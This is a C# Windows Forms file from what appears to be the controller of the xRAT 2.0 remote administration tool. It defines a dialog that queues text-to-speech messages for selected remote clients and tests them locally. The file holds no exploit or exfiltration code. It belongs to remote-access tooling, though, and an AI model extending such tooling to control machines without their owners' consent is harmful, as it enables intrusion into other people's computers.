using SpeechLib;
using System;
using System.Windows.Forms;

namespace xRAT_2.Forms
{
    public partial class frmTextToSpeech : Form
    {
        private int selectedClients;
        public frmTextToSpeech(int selected)
        {
            selectedClients = selected;
            InitializeComponent();
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            TextToSpeech.Speech = txtSpeech.Text;
            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void frmTextToSpeech_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Text to Speech [Selected: {0}]", selectedClients);
            txtSpeech.Text = TextToSpeech.Speech;
        }

        private void btnTest_Click(object sender, EventArgs e)
        {
            SpVoice Voice = new SpVoice();
            Voice.Speak(txtSpeech.Text);
        }
    }

    public class TextToSpeech
    {
        public static string Speech { get; set; }
    }
}
